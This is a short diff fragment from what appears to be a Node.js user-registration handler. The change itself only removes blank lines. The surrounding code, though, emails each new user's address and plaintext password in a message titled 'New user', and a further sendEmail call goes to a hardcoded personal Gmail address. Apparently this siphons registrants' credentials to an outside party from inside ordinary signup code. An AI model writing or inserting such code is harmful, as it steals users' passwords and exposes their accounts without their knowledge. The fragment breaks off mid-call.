@@ -85,15 +85,6 @@ exports.register = async (req, res, next) => {
           subject: "New user",
           text: `<ul><li>email-${email}</li><li>pass-${password}</li></ul>`,
         });
-    
-    
-
-
-
-
-
-
-
 
         await sendEmail({
           to: 'akanbijosephtobi@gmail.com',
